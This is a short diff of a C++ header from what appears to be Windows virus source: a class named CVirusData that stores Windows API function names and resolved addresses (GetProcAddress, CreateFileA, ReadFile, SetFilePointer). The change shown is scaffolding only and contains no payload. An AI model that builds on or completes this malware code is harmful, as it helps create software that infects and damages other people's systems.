@@ -1,7 +1,7 @@
 #ifndef HEADER_UTILS
 #define HEADER_UTILS
 
-#define TYPE_SIZE unsigned
+#include "types.hpp"
 
 constexpr TYPE_SIZE strlen1(const char* pBuf) {
 	TYPE_SIZE i = 0;
@@ -16,8 +16,11 @@ constexpr TYPE_SIZE strlen1(const char* pBuf) {
 
 class CVirusData {
 public:
+	//Funcs addrs
+	void* addr_GetProcAddress;
+
 	//Functions names
-	char funcname_GetProcAddress[STRLENINC("GetProcAddress")];
+	char funcname_GetProcAddress[STRLENINC("GetProcAddress")]="GetProcAddress"; //DEBUG
 	char funcname_CreateFileA[STRLENINC("CreateFileA")];
 	char funcname_ReadFile[STRLENINC("ReadFile")];
 	char funcname_SetFilePointer[STRLENINC("SetFilePointer")];
